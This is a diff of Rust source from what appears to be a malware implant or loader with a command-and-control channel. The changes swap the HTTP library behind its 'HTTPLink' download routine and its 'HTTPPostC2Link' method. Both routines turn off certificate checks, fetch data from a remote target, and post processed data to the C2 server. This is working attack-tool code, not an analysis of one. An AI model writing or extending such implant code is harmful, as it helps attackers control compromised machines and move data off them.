@@ -21,6 +21,7 @@ use std::process;
 use ring::signature::{self, KeyPair};
 use sysinfo::System;
 //use sysinfo::{    Components, Disks, Networks, System, Pid , get_current_pid};
+use attohttpc::header;
 
 use cryptify::encrypt_string;
 use log::debug;
@@ -406,15 +407,14 @@ impl LinkFetch for DNSLink {
 
 impl LinkFetch for HTTPLink {
     fn download_data(&self, config: &Config) -> Result<Vec<u8>, anyhow::Error> {
-        let client = reqwest::blocking::Client::builder()
+        let build: attohttpc::RequestBuilder =
+        attohttpc::get(&self.get_target())
             .danger_accept_invalid_certs(true)
-            .timeout(Duration::from_secs(config.link_timeout))
-            .user_agent(&config.link_user_agent)
-            .build()?;
-
-        let mut res = client.get(&self.get_target()).send()?;
+            .header(header::USER_AGENT, &config.link_user_agent)
+            .timeout(Duration::from_secs(config.link_timeout));
+        let mut response = build.send()?;
         let mut body: Vec<u8> = Vec::new();
-        res.read_to_end(&mut body)?;
+        response.read_to_end(&mut body)?;
         Ok(body)
     }
     fn download_data_post(
@@ -533,6 +533,7 @@ impl LinkFetch for HTTPPostC2Link {
         let m: Vec<u8> =
             apply_all_dataoperations(&mut self.dataoperation_post.clone(), post_data_bytes)?;
 
+        /* 
         let client = reqwest::blocking::Client::builder()
             .danger_accept_invalid_certs(true)
             .timeout(Duration::from_secs(config.link_timeout))
@@ -544,6 +545,19 @@ impl LinkFetch for HTTPPostC2Link {
         res.read_to_end(&mut body)?;
 
         Ok(body)
+        */
+
+        let build =
+        attohttpc::post(&self.get_target())
+            .danger_accept_invalid_certs(true)
+            .header(header::USER_AGENT, &config.link_user_agent)
+            .timeout(Duration::from_secs(config.link_timeout))
+            .bytes(m);
+        let mut response = build.send()?;
+        let mut body: Vec<u8> = Vec::new();
+        response.read_to_end(&mut body)?;
+        Ok(body)
+
     }
 
     fn get_target(&self) -> String {
